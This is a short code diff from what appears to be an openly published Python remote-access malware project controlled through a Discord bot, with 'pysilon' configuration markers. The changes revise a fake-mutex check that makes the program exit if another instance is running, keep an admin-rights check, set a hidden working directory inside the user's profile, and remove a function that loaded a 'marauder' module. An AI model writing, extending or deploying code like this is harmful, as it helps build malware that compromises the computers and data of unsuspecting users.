@@ -90,7 +90,7 @@ guild_id = auto                                                    ##
 ## If you like this project, please leave me a Star on GitHub ;)   ##
 #####################################################################
 
-if fake_mutex_code(software_executable_name):
+if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower():
     os._exit(0)
 
 if IsAdmin():
@@ -115,9 +115,6 @@ latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
-
-def start_marauder():
-    import resources.marauder as marauder
 
 @client.event
 async def on_ready():
